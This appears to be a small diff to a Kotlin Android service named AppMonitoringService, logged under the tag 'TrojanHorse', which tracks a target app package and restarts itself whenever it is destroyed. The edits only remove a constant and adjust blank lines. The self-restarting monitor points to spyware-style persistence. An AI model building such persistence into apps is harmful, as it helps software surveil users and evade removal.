@@ -15,8 +15,8 @@ class AppMonitoringService : Service() {
         private const val TAG = "TrojanHorse"
     }
 
+
     private val targetAppPackage = BuildConfig.TARGET_PACKAGE
-    private val targetActivity = BuildConfig.TARGET_ACTIVITY
     private var lastLoggedApp = ""
 
     override fun onBind(intent: Intent?): IBinder? {
@@ -149,7 +149,6 @@ class AppMonitoringService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         Log.d(TAG, "Service destroyed - attempting restart")
-
         // Restart service if it's destroyed
         val restartServiceIntent = Intent(applicationContext, AppMonitoringService::class.java)
         startService(restartServiceIntent)
